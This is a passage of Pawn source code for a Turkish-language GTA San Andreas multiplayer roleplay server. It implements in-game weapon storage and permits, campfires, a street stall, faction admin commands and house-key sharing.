			        case 36: silahisim1 = "HS Rocket Launcher";
			        case 37: silahisim1 = "Flamethrower";
			        case 38: silahisim1 = "Minigun";
			        case 39: silahisim1 = "Satchel Charge";
			        case 41: silahisim1 = "Spraycan";
			        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
			        case 43: silahisim1 = "Kamera";
			        case 46: silahisim1 = "Paraþüt";
				}
				new string2[128];
				format(string2, sizeof(string2), "%s size %s vermek istiyor.", OyuncuAdiniBul(playerid), silahisim1);
				ShowPlayerDialog(pid, 201, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Silah Sistemi", string2, "Onayla", "Reddet");
				Bilgi(playerid, "Oyuncuya silah verme isteði yolladýnýz.");
			}
			else Hata(playerid, "Hatalý ID girdiniz.");
			return 1;
		}
		else if(Buysa("ruhsat",mstring))
		{
		    new pid;
			pid = strval(nstring);
			if(isnull(nstring)) return Kullanim(playerid, "/silah ruhsat [oyuncuID]");
			if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
			if(!IsPlayerNearPlayer(playerid, pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
			new string[128];
			format(string,sizeof(string),"/me ruhsatý çýkarýr ve %s'a gösterir.",OyuncuAdiniBul(pid));
			if(playerid != pid) OnPlayerCommandPerformed(playerid,string,0);
			new _text[4],_text2[4];
			_text = "Yok";
			_text2 = "Yok";
			if(Karakter[playerid][sruhsat]) _text = "Var";
			if(Karakter[playerid][sruhsat2]) _text2 = "Var";
			SendClientMessageEx(pid, -1, ""C2"[SÝLAH RUHSATI]");
			SendClientMessageEx(pid, -1, ""C2"Ýsim Soyisim: "C1"%s",OyuncuAdiniBul(playerid));
			SendClientMessageEx(pid, -1, ""C2"Doðum Yýlý: "C1"%d",2018-Karakter[playerid][yas]);
			SendClientMessageEx(pid, -1, ""C2"Silah Taþýma Ruhsatý: "C1"%s",_text);
			SendClientMessageEx(pid, -1, ""C2"Silah Bulundurma Ruhsatý: "C1"%s",_text2);
		}
		else if(Buysa("komutlar",mstring))
		{
		    new string[512];
			format(string, sizeof(string), ""C2"[SÝLAHLAR]");
	 		SendClientMessage(playerid, -1, string);
		    SendClientMessage(playerid, COLOR_WHITE, "/deagle, /pistol, /spistol, /shotgun, /sawnoff, /scharge, /fthrower");
		    SendClientMessage(playerid, COLOR_WHITE, "/ysontup, /rpg, /hsrpg, /sniper, /crifle, /molotof, /flash");
		    SendClientMessage(playerid, COLOR_WHITE, "/bomba, /testere, /mdildo, /kbvibra, /bbvibra, /gumvibra, /cicek, /baston");
	  	    SendClientMessage(playerid, COLOR_WHITE, "/katana, /bsopasi, /kurek, /sopa, /bicak, /cop, /musta, /golfsopasi");
		    SendClientMessage(playerid, COLOR_WHITE, "/kamera, /spray, /tec9, /m4, /ak47, /combatgun, /mp5, /uzi, /parasut");
			//format(string, sizeof(string), "{47B312}_________________________________________________________________________________________");
	 		//SendClientMessage(playerid, -1, string);
	 		return 1;
		}
		else if(Buysa("liste",mstring))
		{
			ShowGunsEx(playerid, playerid);
			return 1;
		}
		else if(Buysa("tum",mstring))
		{
			ShowGunsTum(playerid, playerid);
			return 1;
		}
		else if(Buysa("birak",mstring))
		{
			if(isnull(nstring)) return Kullanim(playerid, "/silah birak [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: arac, yer");
			if(Buysa("arac",nstring))
			{
				if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içinde deðilsiniz.");
				new saklanacakarac = GetPlayerVehicleID(playerid);
				if(Arac[saklanacakarac][atip] != 1 && Arac[saklanacakarac][atip] != 2) return Hata(playerid, "Bu araca silah býrakamazsýnýz.");
				if(Arac[saklanacakarac][aowner] != Karakter[playerid][sqlid] && !AracAnahtarKontrol(playerid, saklanacakarac) && (Karakter[playerid][birlik] != Arac[saklanacakarac][abirlik])) return Hata(playerid, "Bu araca silah býrakamazsýnýz."); //meta
				new saklanacaksilah;
				saklanacaksilah = GetPlayerWeapon(playerid);
				if(!SilahKullaniyor[playerid] || !saklanacaksilah) return Hata(playerid, "Elinizde hiç silah yok yada anti-hile izin vermiyor.");
				if(YeterliSilahSlot(saklanacakarac))
				{
				    AracSilahBirak(SilahKullaniyor[playerid], saklanacakarac);
				    new qstring[128];
				    format(qstring, sizeof(qstring), "Baþarýlý. %d idli silahýnýzý baþarýyla aracýn bagajýna býraktýnýz. Kontrol etmek için: ''/silah al arac''",OyuncuSilah[SilahKullaniyor[playerid]][no]);
					Bilgi(playerid, qstring);
					format(qstring, sizeof(qstring), "{a2dab1}%s {c2a2da}model silahý araca býrakýr.", SilahIsim(saklanacaksilah));
					MeGonder(playerid, 30.0, qstring);
					format(qstring, sizeof(qstring), "[SILAH LOG] %d nolu silahini %d idli araca birakti.", OyuncuSilah[SilahKullaniyor[playerid]][no], saklanacakarac);
					Log(playerid, qstring);
					RemovePlayerWeapon(playerid, saklanacaksilah);
				    SilahKullaniyor[playerid] = 0;
				    if(IsPlayerAttachedObjectSlotUsed(playerid, gunindex[playerid])) { SetPVarInt(playerid, "SirtSilah", -1); RemovePlayerAttachedObject(playerid, gunindex[playerid]); gunindex[playerid] = -1; }
				    AracKaydet(saklanacakarac);
				    KarakterKaydet(playerid);
				}
				else
				{
				    Hata(playerid, "Aracýn tüm silah slotlarý dolmuþ.");
				}
			}
			else if(Buysa("yer",nstring))
			{
					new saklanacaksilah, saklanacakmermi;
					saklanacaksilah = GetPlayerWeapon(playerid);
					saklanacakmermi = GetPlayerAmmo(playerid);
					if(!SilahKullaniyor[playerid] || !saklanacaksilah) return Hata(playerid, "Elinizde hiç silah yok yada anti-hile izin vermiyor.");
					if(OyuncuSilah[SilahKullaniyor[playerid]][silahtip] != 1) return Hata(playerid, "Bu silahý yere býrakamazsýnýz.");
					if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araçtayken bu komutu kullanamazsýnýz.");
					new silahmodel = SilahObje(saklanacaksilah), query[256];
				    foreach(new gun : GunsGround)
				    {
				        if(IsPlayerNearDynamicObject(playerid, SilahYer[gun][syobject]) && GetPlayerVirtualWorld(playerid) == SilahYer[gun][syvworld])
						{
				            Hata(playerid, "Yakýnýnýzda bir veya birden fazla silah mevcut. Hata ile karþýlaþmamak için uzaklaþmalýsýnýz.");
				            return 1;
				        }
				    }
					new syovworld = GetPlayerVirtualWorld(playerid);
					new syovint = GetPlayerInterior(playerid);
				    GetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
					format(query, sizeof(query), "INSERT INTO `silahyer` (`syposx`, `syposy`, `syposz`, `syvworld`, `syinterior`, `sysilah`, `no`, `oyuncuid`) VALUES ('%f', '%f', '%f', '%d', '%d', '%d', '%d', '%d')",Karakter[playerid][posx],Karakter[playerid][posy],Karakter[playerid][posz]-1, syovworld, syovint, saklanacaksilah, OyuncuSilah[SilahKullaniyor[playerid]][no],OyuncuSilah[SilahKullaniyor[playerid]][oyuncuid]);
					new Cache:cache = mysql_query(query, true);
					print(query);
					new i = cache_insert_id();
					cache_delete(cache);
					SilahYer[i][syobject] = CreateDynamicObject(silahmodel, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]-1, 93.7, 120.0, 120.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
					SilahYer[i][syvworld] = GetPlayerVirtualWorld(playerid);
					SilahYer[i][syinterior] = GetPlayerInterior(playerid);
					SilahYer[i][sysilah] = saklanacaksilah;
					SilahYer[i][symermi] = saklanacakmermi;
					SilahYer[i][syposx] = Karakter[playerid][posx];
					SilahYer[i][syposy] = Karakter[playerid][posy];
					SilahYer[i][syposz] = Karakter[playerid][posz]-1;
					SilahYer[i][syid] = i;
					Iter_Add(GunsGround, i);
					Karakter[playerid][sysobjectd] = i;
				    OyuncuSilah[SilahKullaniyor[playerid]][durum] = 2;
    				OyuncuSilahKaydetEx(SilahKullaniyor[playerid]);
				    KarakterKaydet(playerid);
				    format(query, sizeof(query), "Baþarýlý bir þekilde %d idli silahý yere býraktýnýz.",OyuncuSilah[SilahKullaniyor[playerid]][no]);
				    Bilgi(playerid, query);
                    format(query, sizeof(query), "{a2dab1}%s {c2a2da}model silahý yere býrakýr.", SilahIsim(saklanacaksilah));
					MeGonder(playerid, 30.0, query);
				    format(query, sizeof(query), "[SILAH LOG] %d nolu silahi yere birakti.",OyuncuSilah[SilahKullaniyor[playerid]][no]);
				    Log(playerid, query);
					Ipucu(playerid, "Herhangi bir kayýp ile karþýlaþtýðýnýzda destek paneli üzerinden bize ulaþýnýz.");
					Ipucu(playerid, "Silahýnýzýn modeli ve bulunduðunuz konum log panelimize kayýt edildi.");
					RemovePlayerWeapon(playerid, saklanacaksilah);
					if(IsPlayerAttachedObjectSlotUsed(playerid, gunindex[playerid])) { SetPVarInt(playerid, "SirtSilah", -1); RemovePlayerAttachedObject(playerid, gunindex[playerid]); gunindex[playerid] = -1; }
				    SilahKullaniyor[playerid] = 0;
			}
			return 1;
		}
		else if(Buysa("al",mstring))
		{
		    if(isnull(nstring)) return Kullanim(playerid, "/silah al [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: arac, yer");
			if(Buysa("arac",nstring))
			{
				if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Silahý almak istediðiniz aracýn içerisinde olmalýsýnýz.");
				if(Karakter[playerid][sqlid] != Arac[GetPlayerVehicleID(playerid)][aowner] && (Karakter[playerid][birlik] != Arac[GetPlayerVehicleID(playerid)][abirlik]) && !AracAnahtarKontrol(playerid, GetPlayerVehicleID(playerid)) && Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return Hata(playerid, "Bu araçtaki silahlarý göremezsiniz.");
				new saklanacakarac;
				saklanacakarac = GetPlayerVehicleID(playerid);
				silahalev[playerid] = saklanacakarac;
				AracSilahAl(playerid,saklanacakarac);
			}
			else if(Buysa("yer",nstring))
			{
				new query[512];
				foreach(new sy : GunsGround)
				{
				    //if(IsPlayerInRangeOfPoint(playerid, 2.5, SilahYer[sy][syposx], SilahYer[sy][syposy], SilahYer[sy][syposz]) && SilahYer[sy][syvworld] == GetPlayerVirtualWorld(playerid))
					//if(!IsValidDynamicObject(SilahYer[sy][syobject])) continue;
					if(IsPlayerInRangeOfPoint(playerid, 2.5, SilahYer[sy][syposx], SilahYer[sy][syposy], SilahYer[sy][syposz]) && GetPlayerVirtualWorld(playerid) == SilahYer[sy][syvworld] && GetPlayerInterior(playerid) == SilahYer[sy][syinterior])
					{
							new _no = SilahYerNoCek(SilahYer[sy][syid]);
							new _id;
							foreach(new i : Guns)
							{
							    if(OyuncuSilah[i][no] == _no)
							    {
							        _id = i;
							        break;
							    }
							}
							if(OyuncuSilah[_id][oyuncuid] != Karakter[playerid][sqlid] && GetPlayerInterior(playerid) != 0 && GetPlayerVirtualWorld(playerid) != 0) return Hata(playerid, "Bu silahý alamazsýnýz.");
							if(HafifSilah(OyuncuSilah[_id][silahid]) && HafifSilahVar(playerid)) return Hata(playerid, "Üzerinizde sadece 1 adet hafif silah bulundurabilirsiniz.");
							if(AgirSilah(OyuncuSilah[_id][silahid]) && AgirSilahVar(playerid)) return Hata(playerid, "Üzerinizde sadece 1 adet aðýr silah bulundurabilirsiniz.");
							OyuncuSilah[_id][oyuncuid] = Karakter[playerid][sqlid];
							OyuncuSilah[_id][durum] = 1;
							OyuncuSilahKaydetEx(_id);
        					new alinansilah = SilahYer[sy][sysilah];
						    new string[128];
							format(string, sizeof(string), "Silahý baþarýyla yerden aldýnýz. Silah: %s", SilahIsim(alinansilah));
							Bilgi(playerid, string);
							format(string, sizeof(string), "{a2dab1}%s {c2a2da}model silahý yerden alýr.", SilahIsim(alinansilah));
							MeGonder(playerid, 30.0, string);
							format(string, sizeof(string), "[SILAH LOG] %d nolu silahi yerden aldi.", OyuncuSilah[_id][no]);
							Log(playerid, string);
							DestroyDynamicObject(SilahYer[sy][syobject]);
							SilahYer[sy][syposx] = 0;
							SilahYer[sy][syposy] = 0;
							SilahYer[sy][syposz] = 0;
							SilahYer[sy][sysilah] = 0;
							Iter_Remove(GunsGround, sy);
							format(query, sizeof(query), "DELETE FROM `silahyer` WHERE `id` = '%d'", SilahYer[sy][syid]);
							mysql_tquery(1,query);
							return 1;
				    }
				}
				Hata(playerid, "Bulunduðunuz yerde bir silah yok.");
			}
		    return 1;
		}
	}
	return 1;
}
CMD:odun(playerid, params[])
{
    new mstring[24];
    if(sscanf(params, "s[24]",mstring)) return Kullanim(playerid, "/odun [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: yak, sondur");
	if(Buysa("yak",mstring))
	{
	    if(Karakter[playerid][odun] > 0)
	    {
	        if(isOn[playerid] == 0)
	        {
	            new playerState = GetPlayerState(playerid);
	            if(playerState != PLAYER_STATE_ONFOOT) return Hata(playerid, "Þuanda odun yakamazsýnýz.");
		        new Float:yerx, Float:yery, Float:yerz;
		        GetPlayerPos(playerid, yerx, yery, yerz);
		        CreateObjectCampfire(campnumber[playerid], yerx, yery, yerz, 0);
				isOn[playerid] = 1;
				SetPVarInt(playerid, "OdunTimer", SetTimerEx("DestroyCampfire", campfiretime, false, "i", playerid));
				Bilgi(playerid, "Odun yaktýnýz.");
				Karakter[playerid][odun]--;
				return 1;
			}
			else
			{
			    Hata(playerid, "Daha önce odun yakmýþsýnýz. Ateþi söndürmek için: ''/odun sondur''");
			    return 1;
			}
	    }
	    else
	    {
	        Hata(playerid, "Üzerinizde hiç odun yok. Marketlerden satýn alabilirsiniz.");
		}
	}
	else if(Buysa("sondur",mstring))
	{
		if(IsPlayerInRangeOfFire(playerid, 3))
	    {
	        DestroyObjectCampfire(campnumber[playerid]);
	        KillTimer(GetPVarInt(playerid, "OdunTimer"));
	        isOn[playerid] = 0;
	        Bilgi(playerid, "Ateþi baþarýyla söndürdünüz.");
	        return 1;
	    }
	    else
	    {
	        Hata(playerid, "Yakmýþ olduðunuz ateþin yakýnýnda deðilsiniz.");
	        return 1;
	    }
	}
    return 1;
}
CMD:tezgah(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    new mstring[24];
	    new fiyat, giveplayerid2[24];
     	if(isnull(params)) return Kullanim(playerid, "/tezgah [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir, sat");
		sscanf(params,"s[24]s[24]d",mstring,giveplayerid2,fiyat);
		if(Karakter[playerid][kodes] > 0) return Hata(playerid, "Þuan tezgah kuramazsýnýz.");
		if(Buysa("sat",mstring))
		{
		    if(Tezgah[playerid][0])
	        {
    			if(isnull(giveplayerid2)) return Kullanim(playerid, "/tezgah sat [oyuncuID] [fiyat(opsiyonel)]");
    			new giveplayerid = strval(giveplayerid2);
	            if(ProxDetectorS(5.0, playerid, giveplayerid) && playerid != giveplayerid && PlayerToPoint(20.0, playerid, tPos[playerid][0], tPos[playerid][1], tPos[playerid][2]))
	            {
	                if(isnull(mstring)) fiyat = 15;
	                if( fiyat < 0 || fiyat > 101)
					{
						Hata(playerid, "Satýþ fiyatý 1 dolar ile 100 dolar arasý olabilir.");
						return 1;
					}
					new string[256];
					Bilgi(playerid, "Satýþ isteðiniz gönderildi. Lütfen bekleyiniz.");
	                format(string, sizeof(string), "%s size %d dolara sosisli satmak istiyor. Kabul ediyor musunuz?", OyuncuAdiniBul(playerid), fiyat);
	                SetPVarInt(giveplayerid, "SosisliSatan", playerid);
	                SetPVarInt(giveplayerid, "SosisliFiyat", fiyat);
	                ShowPlayerDialog(giveplayerid, 169, DIALOG_STYLE_MSGBOX, "Alýþveriþ Ýsteði", string, "Evet", "Hayýr");
	            }
	        }
		}
		else if(Buysa("kur",mstring))
		{
			if(Karakter[playerid][tezgah] == 1)
			{
				if(!Tezgah[playerid][0])
				{
					new Float:ang;
					GetPlayerPos(playerid, tPos[playerid][0], tPos[playerid][1], tPos[playerid][2]);
					GetPlayerFacingAngle(playerid,ang);
					GetXYInFrontOfPlayer(playerid, tPos[playerid][0], tPos[playerid][1], tPos[playerid][2], 1.5);
					Tezgah[playerid][1] = GetPlayerVirtualWorld(playerid);
					Tezgah[playerid][2] = GetPlayerInterior(playerid);
					Tezgah[playerid][0] = CreateDynamicObject(1340, tPos[playerid][0], tPos[playerid][1], tPos[playerid][2], 0.0, 0.0, ang+90, Tezgah[playerid][1], Tezgah[playerid][2]);
					Bilgi(playerid, "Tezgahýnýz baþarýyla yerleþtirildi.");
					new string[128];
	        		format(string, sizeof(string), "{7EFB1A}%s",OyuncuAdiniBul(playerid));
					TezgahLabel[playerid] = CreateDynamic3DTextLabel(string,-1,tPos[playerid][0], tPos[playerid][1], tPos[playerid][2]-0.4, 10, .worldid=GetPlayerVirtualWorld(playerid),.interiorid=GetPlayerInterior(playerid));
					Streamer_Update(playerid);
				}
				else
				{
					Hata(playerid, "Zaten kurulu tezgahýnýz bulunmaktadýr.");
				}
			}
			else Hata(playerid, "Tezgahýnýz bulunmamaktadýr.");
		}
		else if(Buysa("kaldir",mstring))
		{
			if(Tezgah[playerid][0])
			{
				DestroyDynamicObject(Tezgah[playerid][0]);
				for(new i; i < 3; i++) tPos[playerid][i] = 0;
				for(new i; i < 3; i++) Tezgah[playerid][i] = 0;
				Bilgi(playerid, "Tezgahýnýz baþarýyla kaldýrýldý.");
				DestroyDynamic3DTextLabel(TezgahLabel[playerid]);
				Streamer_Update(playerid);
			}
			else
			{
				Hata(playerid, "Tezgahýnýzý kurmamýþsýnýz.");
			}
		}
	}
	return 1;
}
CMD:birlikler(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] > 0 && AKontrol(playerid) && Girdi[playerid])
	    {
	        SendClientMessage(playerid, -1,"____________________Birlikler____________________");
	        for(new i;i<MAX_BIRLIK;i++)
	        {
	            if(!isnull(Birlik[i][fisim])) SendClientMessageEx(playerid, -1, "(%d)%s - Tip: %d", i, Birlik[i][fisim], Birlik[i][ftip]);
	        }
		}
	}
	return 1;
}
CMD:liderler(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] > 0 && AKontrol(playerid) && Girdi[playerid])
	    {
	        SendClientMessage(playerid, -1,"____________________Liderler____________________");
	        for(new i;i<MAX_PLAYERS;i++)
	        {
	            new playername[MAX_PLAYER_NAME];
	            GetPlayerName(i, playername, MAX_PLAYER_NAME);
	            if(Girdi[i] && Karakter[i][rutbe] == 1) SendClientMessageEx(playerid, -1, "(%d)%s - Birlik: %s", i, playername, Birlik[Karakter[i][birlik]][fisim]);
	        }
		}
	}
	return 1;
}
CMD:gruplar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] > 0)
	    {
	        SendClientMessage(playerid, -1,"____________________Gruplar____________________");
	        for(new i;i<MAX_GRUP;i++)
	        {
	            if(!isnull(Grup[i][gisim])) SendClientMessageEx(playerid, -1, "(%d)%s - Lider: %s", i, Grup[i][gisim], SQLFromName(Grup[i][lider]));
	        }
		}
	}
	return 1;
}
CMD:birlikid(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] > 0 && AKontrol(playerid))
	    {
	        new pid;
	        new mstring[128];
	        if(sscanf(params, "u",pid)) return Kullanim(playerid, "/birlikid [oyuncuID]");
	        if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
       		format(mstring, sizeof(mstring), "%s - %s - %d",OyuncuAdiniBul(pid),Birlik[Karakter[pid][birlik]][fisim],Karakter[pid][birlik]);
	        if(Karakter[pid][birlik] == 0) format(mstring, sizeof(mstring), "%s - Serbest",OyuncuAdiniBul(pid));
			Bilgi(playerid, mstring);
	    }
	}
	return 1;
}
CMD:birliktip(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 5 && AKontrol(playerid))
	    {
	        new fid,tid;
	        new mstring[128];
	        if(sscanf(params, "dd",fid,tid)) return Kullanim(playerid, "/birliktip [factID] [tip]");
			Birlik[fid][ftip] = tid;
			format(mstring, sizeof(mstring), "%s adlý birliðin tipini %d olarak deðiþtirdiniz.",Birlik[fid][fisim],tid);
			Bilgi(playerid, mstring);
			BirlikKaydet(fid);
	    }
	}
	return 1;
}
CMD:birlikseviye(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 5 && AKontrol(playerid))
	    {
	        new fid,tid;
	        new mstring[128];
	        if(sscanf(params, "dd",fid,tid)) return Kullanim(playerid, "/birlikseviye [factID] [seviye]");
			Birlik[fid][seviye] = tid;
			format(mstring, sizeof(mstring), "%s adlý birliðin seviyesini %d olarak deðiþtirdiniz.",Birlik[fid][fisim],tid);
			Bilgi(playerid, mstring);
			BirlikKaydet(fid);
	    }
	}
	return 1;
}
CMD:birlikitibar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 5 && AKontrol(playerid))
	    {
	        new fid,tid;
	        new mstring[128];
	        if(sscanf(params, "dd",fid,tid)) return Kullanim(playerid, "/birlikitibar [factID] [itibar]");
			Birlik[fid][itibar] = tid;
			format(mstring, sizeof(mstring), "%s adlý birliðin itibarýný %d olarak deðiþtirdiniz.",Birlik[fid][fisim],tid);
			Bilgi(playerid, mstring);
			BirlikKaydet(fid);
	    }
	}
	return 1;
}
CMD:birlikonay(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 5 && AKontrol(playerid))
	    {
	        new fid,tid;
	        new mstring[128];
	        if(sscanf(params, "dd",fid,tid)) return Kullanim(playerid, "/birlikonay [factID] [onaydurumu](1:Onaylý-0:Onaysýz)");
			Birlik[fid][onay] = tid;
			format(mstring, sizeof(mstring), "%s adlý birliðin onay durumunu %d olarak deðiþtirdiniz.",Birlik[fid][fisim],tid);
			Bilgi(playerid, mstring);
			BirlikKaydet(fid);
	    }
	}
	return 1;
}
CMD:aehliyet(playerid, params[])
{
	if(Girdi[playerid])
	{
	    if(Karakter[playerid][adminlevel] >= 1 && AKontrol(playerid))
	    {
			new pid, eh;
			if(sscanf(params,"ud",pid,eh)) return Kullanim(playerid, "/aehliyet [oyuncuID] [0-1](1 Verir-0 Alýr)");
			if(!IsPlayerConnected(pid)) return Hata(playerid, "Hatalý oyuncu id.");
			if(eh != 1 && eh != 0) return Hata(playerid, "Sadece 0 veya 1 girebilirsiniz.");
			new mstring[128];
			Karakter[pid][ehliyet] = eh;
			switch(eh)
			{
			    case 0:
			    {
					format(mstring, sizeof(mstring), "%s isimli oyuncunun ehliyetini aldýnýz.",OyuncuAdiniBul(pid));
					Bilgi(playerid, mstring);
					format(mstring, sizeof(mstring), "%s sizin ehliyetinizi aldý.",Karakter[playerid][anick]);
					Bilgi(pid, mstring);
				}
				case 1:
				{
					format(mstring, sizeof(mstring), "%s isimli oyuncuya ehliyet verdiniz.",OyuncuAdiniBul(pid));
					Bilgi(playerid, mstring);
					format(mstring, sizeof(mstring), "%s size ehliyet verdi.",Karakter[playerid][anick]);
					Bilgi(pid, mstring);
				}
			}
	    }
	}
	return 1;
}
CMD:evanahtar(playerid, params[])
{
	if(Girdi[playerid])
	{
	    new pid,evid;
	    if(sscanf(params,"dd",evid,pid)) return Kullanim(playerid, "/evanahtar [evID] [oyuncuID]"),Ipucu(playerid, "Evinizin yedek anahtarýný bir baþkasýyla paylaþmanýzý saðlar."),Ipucu(playerid, "Eðer evinizin yedek anahtarýný sýfýrlamak istiyorsanýz -1 deðerini girin.");
		if(Ev[evid][esahip] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu evin sahibi siz deðilsiniz.");
		if(pid == -1)
		{
			Bilgi(playerid, "Evinizin anahtarýný sýfýrladýnýz.");
			EvAnahtarTumSil(evid);
		}
		else
		{
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ])) return Hata(playerid, "Evin yakýnýnda deðilsiniz.");
		    if(!IsPlayerConnected(pid) || pid == playerid) return Hata(playerid, "Belirttiðiniz oyuncu oyuna baðlý deðil.");
			new mstring[256];
			if(!EvAnahtarKontrol(pid, evid))
			{
				format(mstring, sizeof(mstring), "%s adlý oyuncuya %d idli evin anahtarýný verdiniz.",OyuncuAdiniBul(pid),evid);
				Bilgi(playerid, mstring);
				format(mstring, sizeof(mstring), "%s size %d idli evin anahtarýný verdi.",OyuncuAdiniBul(playerid),evid);
				Bilgi(pid, mstring);
				EvAnahtarVer(pid, evid);
			}
			else
			{
				format(mstring, sizeof(mstring), "%s adlý oyuncudan %d idli evin anahtarýný aldýnýz.",OyuncuAdiniBul(pid),evid);
				Bilgi(playerid, mstring);
				format(mstring, sizeof(mstring), "%s sizden %d idli evin anahtarýný aldý.",OyuncuAdiniBul(playerid),evid);
				Bilgi(pid, mstring);
				EvAnahtarSil(pid, evid);
			}
		}
	}
	return 1;
}
YeterliSilahSlot(aracid)
{
	new sinir=0,query[128],rowcek,rows,fields;
	for(new i = 0; i < sizeof(AracSilah) ; i++)
	{
		if(GetVehicleModel(aracid) == AracSilah[i][0])
		{
			sinir = AracSilah[i][1];
			break;
		}
	}
	format(query, sizeof(query), "SELECT * FROM `aracsilah` WHERE `aracID` = '%d'",Arac[aracid][aid]);
	new Cache:cache = mysql_query(query,true);
	cache_get_data(rows, fields, g_iHandle);
	rowcek = rows;
	cache_delete(cache);
	if(rowcek < sinir) return 1;
	return 0;
}
AracSilahBirak(_silahid, aracid)
{
    new query[128];
	format(query, sizeof(query), "INSERT INTO `aracsilah` (`silahID`,`mermi`,`aracID`,`no`,`oyuncuid`) VALUES ('%d','%d','%d','%d','%d')", OyuncuSilah[_silahid][silahid],OyuncuSilah[_silahid][mermi],Arac[aracid][aid],OyuncuSilah[_silahid][no],OyuncuSilah[_silahid][oyuncuid]);
	mysql_tquery(1,query);
	OyuncuSilah[_silahid][durum] = 3;
	OyuncuSilahKaydetEx(_silahid);
}
AracSilahElkoy(playerid, aracid)
{
	if(!IsPlayerInVehicle(playerid, silahalev[playerid])) return Hata(playerid, "Silahý almak istediðiniz aracýn içerisinde olmalýsýnýz.");
	new query[128],mstring[512];
	new silahisim1[60],sid,rows,fields,mermis,_no;
	format(query, sizeof(query), "SELECT * FROM `aracsilah` WHERE `aracID` = '%d'",Arac[aracid][aid]);
	new Cache:cache = mysql_query(query,true);
	cache_get_data(rows, fields, g_iHandle);
	if(!cache_get_row_count()) return Hata(playerid, "Araçta silah bulunmamaktadýr.");
	for (new i = 0; i < rows; i ++)
	{
			sid = cache_get_field_content_int(i, "silahID");
			mermis = cache_get_field_content_int(i, "mermi");
			_no = cache_get_field_content_int(i, "no");
		    switch(sid)
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
	    	format(mstring,sizeof(mstring),"%s%d\t%s[%d]\t%d\n",mstring,_no,silahisim1,sid,mermis);
	}
	cache_delete(cache);
	format(mstring,sizeof(mstring),"NO\tSilah Adý\tMermi\n%s",mstring);
	ShowPlayerDialog(playerid, 358, DIALOG_STYLE_TABLIST_HEADERS,""C7"EIGHTBORN - "C8"Araç Silah Elkoy", mstring, "Elkoy", "Ýptal");
	return 1;
}
AracSilahAl(playerid, aracid)
{
	if(!IsPlayerInVehicle(playerid, silahalev[playerid])) return Hata(playerid, "Silahý almak istediðiniz aracýn içerisinde olmalýsýnýz.");
	new query[128],mstring[512];
	new silahisim1[60],sid,rows,fields,mermis,_no;
	format(query, sizeof(query), "SELECT * FROM `aracsilah` WHERE `aracID` = '%d'",Arac[aracid][aid]);
	new Cache:cache = mysql_query(query,true);
	cache_get_data(rows, fields, g_iHandle);
	if(!cache_get_row_count()) return Hata(playerid, "Aracýnýzda silah bulunmamaktadýr.");
	for (new i = 0; i < rows; i ++)
	{
